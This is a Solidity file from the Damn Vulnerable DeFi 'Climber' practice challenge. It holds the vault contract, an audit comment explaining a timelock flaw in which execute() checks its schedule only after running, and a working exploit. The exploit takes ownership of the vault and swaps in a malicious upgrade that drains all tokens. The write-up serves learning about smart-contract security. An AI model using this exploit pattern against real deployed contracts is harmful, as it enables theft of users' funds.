// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

// @audit Anyone can call ClimberTimelock.execute() which can execute
// multiple sequential arbitrary code segments the attacker controls and it only
// checks that the operation exists in ClimberTimelockBase.operations after execution.
//
// Can we use this to execute our payload in such a way that it will
// also populate ClimberTimelockBase.operations to pass the check after
// execution?
//
// ClimberTimelockBase.operations is populated by ClimberTimelock.schedule()
// which can only be called by PROPOSER_ROLE. However ClimberTimelock itself
// has ADMIN_ROLE which is set as the admin of the PROPOSER_ROLE in constructor.
// Hence ClimberTimelock can add new addresses to PROPOSER_ROLE.
//
// Attack via call to ClimberTimelock.execute() and use that to:
//
// a) call ClimberTimelock.updateDelay() to set delay = 0
//
// b) as ClimberTimelock is owner of ClimberVault, transfer ownership to
// attacker address
//
// c) grant PROPOSER_ROLE to attack contract,
//
// d) use ClimberTimelock.execute() to callback into attack contract, then call
// ClimberTimelock.schedule() to populate ClimberTimelockBase.operations
// with our payload to pass the check at the end of ClimberTimelock.execute()
//
// d) attacker can then upgrade ClimberVault to new version that re-implements
// sweepFunds() to allow the owner to drain all the tokens
//
contract ClimberVaultAttack {
    address payable immutable climberTimeLock;

    // parameters for ClimberTimelock.execute() & ClimberTimelock.schedule()
    address[] targets = new address[](4);
    uint256[] values = [0, 0, 0, 0];
    bytes[] dataElements = new bytes[](4);
    bytes32 salt = bytes32("!.^.0.0.^.!");

    constructor(address payable _climberTimeLock, address _climberVault) {
        climberTimeLock = _climberTimeLock;

        // address upon which function + parameter payloads will be called by ClimberTimelock.execute()
        targets[0] = climberTimeLock;
        targets[1] = _climberVault;
        targets[2] = climberTimeLock;
        targets[3] = address(this);

        // first payload call ClimberTimelock.delay()
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        // second payload call ClimberVault.transferOwnership()
        dataElements[1] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, msg.sender);
        // third payload call to ClimberTimelock.grantRole()
        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));
        // fourth payload call ClimberVaultAttack.corruptSchedule()
        // I tried to have it directly call ClimberTimelock.schedule() but this was
        // resulting in a different ClimberTimelockBase.getOperationId() as the last
        // element of dataElements was visible inside ClimberTimelock.execute() but not
        // within ClimberTimelock.schedule(). Calling instead to a function back in
        // the attack contract and having that call ClimberTimelock.schedule() gets
        // around this
        dataElements[3] = abi.encodeWithSelector(ClimberVaultAttack.corruptSchedule.selector);
    }

    function corruptSchedule() external {
        ClimberTimelock(climberTimeLock).schedule(targets, values, dataElements, salt);
    }

    function attack() external {
        ClimberTimelock(climberTimeLock).execute(targets, values, dataElements, salt);
    }
}

// once attacker has ownership of ClimberVault, they will upgrade it to
// this version which modifies sweepFunds() to allow owner to drain tokens
contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // must preserve storage layout or upgrade will fail
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address, address, address) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    // changed to allow only owner to drain funds
    function sweepFunds(address token) external onlyOwner {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    // prevent anyone but attacker from further upgrades
    function _authorizeUpgrade(address) internal override onlyOwner {}
}
